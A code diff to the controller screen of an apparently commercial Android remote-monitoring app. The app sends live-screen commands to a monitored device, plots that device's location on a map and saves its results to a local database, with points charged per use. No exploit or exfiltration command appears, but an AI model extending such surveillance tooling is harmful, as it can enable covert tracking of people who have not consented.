@@ -39,6 +39,7 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
+import com.google.firebase.database.ChildEventListener
 import org.osmdroid.config.Configuration
 import org.osmdroid.util.GeoPoint
 import org.osmdroid.views.MapView
@@ -53,7 +54,9 @@ import java.io.FileOutputStream
 import java.net.URL
 
 class MonitorActivity : AppCompatActivity() {
-
+    private lateinit var dbHelper: LocalDatabaseHelper
+    private var liveScreenActive = false
+    private var liveScreenJob: kotlinx.coroutines.Job? = null
     private lateinit var sessionKey: String
     private lateinit var database: DatabaseReference
     private lateinit var tvResults: TextView
@@ -123,6 +126,7 @@ class MonitorActivity : AppCompatActivity() {
         btnSaveAudio = findViewById(R.id.btnSaveAudio)
         llResults = findViewById(R.id.llResults)
         tvResults = findViewById(R.id.tvResults)
+        dbHelper = LocalDatabaseHelper(this)
 
         tabLayout = findViewById(R.id.tabLayout)
         tabControls = findViewById(R.id.tabControls)
@@ -227,14 +231,35 @@ class MonitorActivity : AppCompatActivity() {
         }
 
         findViewById<Button>(R.id.btnStartLiveScreen).setOnClickListener {
-            checkAndDeductPoints(200, "Start Live Screen") {
-                sendCommand("START_LIVE_SCREEN")
-                tabLayout.getTabAt(2)?.select() // Jump to Screen Tab
+            if (!liveScreenActive) {
+                checkAndDeductPoints(150, "Start Live Screen") {
+                    liveScreenActive = true
+                    sendCommand("START_LIVE_SCREEN")
+                    tabLayout.getTabAt(2)?.select()
+
+                    val prefs = getSharedPreferences("x24_prefs", android.content.Context.MODE_PRIVATE)
+                    liveScreenJob = CoroutineScope(Dispatchers.Main).launch {
+                        while (liveScreenActive) {
+                            kotlinx.coroutines.delay(30000)
+                            if (liveScreenActive) {
+                                checkAndDeductPoints(150, "Live Screen Tick") {}
+                                val pts = prefs.getInt("USER_POINTS", 0)
+                                if (pts < 150) {
+                                    liveScreenActive = false
+                                    sendCommand("STOP_LIVE_SCREEN")
+                                    Toast.makeText(this@MonitorActivity, "Out of points. Live Screen stopped.", Toast.LENGTH_SHORT).show()
+                                }
+                            }
+                        }
+                    }
+                }
             }
         }
 
         val btnStopLiveScreen = findViewById<Button>(R.id.btnStopLiveScreen)
         btnStopLiveScreen.setOnClickListener {
+            liveScreenActive = false
+            liveScreenJob?.cancel()
             sendCommand("STOP_LIVE_SCREEN", btnStopLiveScreen)
         }
 
@@ -632,64 +657,100 @@ class MonitorActivity : AppCompatActivity() {
             override fun onCancelled(error: DatabaseError) {}
         })
 
-        database.child("results").addValueEventListener(object : ValueEventListener {
-            override fun onDataChange(snapshot: DataSnapshot) {
-                val children = snapshot.children.toList()
-                val latestKey = children.lastOrNull()?.key
-                val shouldRedirect = lastProcessedResultKey != null && latestKey != lastProcessedResultKey
+                // Initially load logs from local database
+        refreshHistoryFromLocalDatabase()
 
-                if (shouldRedirect) {
+        // Listen for ONLY newly added results in Firebase
+        database.child("results").addChildEventListener(object : ChildEventListener {
+            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
+                val type = snapshot.child("type").value as? String
+                val data = snapshot.child("data").value as? String
+                val timestamp = snapshot.child("timestamp").value as? Long ?: System.currentTimeMillis()
+
+                if (type != null && data != null) {
+                    // Save to local DB
+                    dbHelper.insertLog(type, data, timestamp)
+
+                    // Refresh UI
+                    refreshHistoryFromLocalDatabase(shouldRedirect = true)
+
+                    // Delete from Firebase
+                    snapshot.ref.removeValue()
+
                     resetAllPendingButtons()
-                }
-
-                // Clear map overlays before adding new ones from history
-                mapView.overlays.clear()
-                val geoPoints = mutableListOf<GeoPoint>()
-
-                // Rebuild UI history
-                llResults.removeAllViews()
-                llResults.addView(tvResults) // Keep the original text view at top if needed
-                llResults.addView(btnSaveAudio)
-
-                for (child in children) {
-                    val type = child.child("type").value as? String
-                    val data = child.child("data").value as? String
-
-                    val isNewAndLatest = shouldRedirect && child.key == latestKey
-
-                    if (type != null && data != null) {
-                        appendResultToHistory(type, data, geoPoints, isNewAndLatest)
-                    }
-                }
-
-                if (latestKey != null) {
-                    lastProcessedResultKey = latestKey
-                }
-
-                // Update map if locations exist
-                if (geoPoints.isNotEmpty()) {
-                    mapView.visibility = View.VISIBLE
-                    val polyline = Polyline()
-                    polyline.setPoints(geoPoints)
-                    polyline.color = Color.BLUE
-                    mapView.overlays.add(polyline)
-
-                    val currentPoint = geoPoints.last()
-                    val marker = Marker(mapView)
-                    marker.position = currentPoint
-                    marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
-                    marker.title = "Current Location"
-                    mapView.overlays.add(marker)
-
-                    mapView.controller.setZoom(15.0)
-                    mapView.controller.setCenter(currentPoint)
                 }
             }
 
+            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
+            override fun onChildRemoved(snapshot: DataSnapshot) {}
+            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
             override fun onCancelled(error: DatabaseError) {
                 Toast.makeText(this@MonitorActivity, "Error listening to results", Toast.LENGTH_SHORT).show()
             }
         })
+    }
+
+    private fun refreshHistoryFromLocalDatabase(shouldRedirect: Boolean = false) {
+        val allLogs = dbHelper.getAllLogs()
+
+        // Clear map overlays before adding new ones from history
+        mapView.overlays.clear()
+        val geoPoints = mutableListOf<GeoPoint>()
+
+        // Rebuild UI history
+        llResults.removeAllViews()
+        llResults.addView(tvResults) // Keep the original text view at top if needed
+        llResults.addView(btnSaveAudio)
+
+        // Add Clear Logs Button Programmatically to the top of logs if not empty
+        if (allLogs.isNotEmpty()) {
+            val btnClearLocalLogs = Button(this@MonitorActivity).apply {
+                text = "Clear Local Logs"
+                setOnClickListener {
+                    dbHelper.clearLogs()
+                    refreshHistoryFromLocalDatabase()
+                    Toast.makeText(this@MonitorActivity, "Local logs cleared", Toast.LENGTH_SHORT).show()
+                }
+            }
+            llResults.addView(btnClearLocalLogs)
+        }
+
+        for ((index, log) in allLogs.withIndex()) {
+            val isNewAndLatest = shouldRedirect && index == allLogs.size - 1
+            appendResultToHistory(log.type, log.data, geoPoints, isNewAndLatest)
+        }
+
+        // Check local DB size and warn user
+        if (shouldRedirect) {
+            val sizeMb = dbHelper.getDatabaseSizeMB()
+            if (sizeMb > 100.0) {
+                Toast.makeText(this@MonitorActivity, "Local data is %.2f MB. Please clear local logs soon.".format(sizeMb), Toast.LENGTH_LONG).show()
+                tvResults.text = "Logs and Results (WARNING: Local Data exceeds 100MB. Please clear logs.)"
+                tvResults.setTextColor(Color.RED)
+            } else {
+                 tvResults.text = "Logs and Results will appear here..."
+                 tvResults.setTextColor(Color.BLACK)
+            }
+        }
+
+        // Update map if locations exist
+        if (geoPoints.isNotEmpty()) {
+            mapView.visibility = View.VISIBLE
+            val polyline = Polyline()
+            polyline.setPoints(geoPoints)
+            polyline.color = Color.BLUE
+            mapView.overlays.add(polyline)
+
+            val currentPoint = geoPoints.last()
+            val marker = Marker(mapView)
+            marker.position = currentPoint
+            marker.setAnchor(Marker.ANCHOR_CENTER, Marker.ANCHOR_BOTTOM)
+            marker.title = "Current Location"
+            mapView.overlays.add(marker)
+
+            mapView.controller.setZoom(15.0)
+            mapView.controller.setCenter(currentPoint)
+        }
     }
 
     private fun appendResultToHistory(type: String, data: String, geoPoints: MutableList<GeoPoint>, shouldRedirect: Boolean = false) {
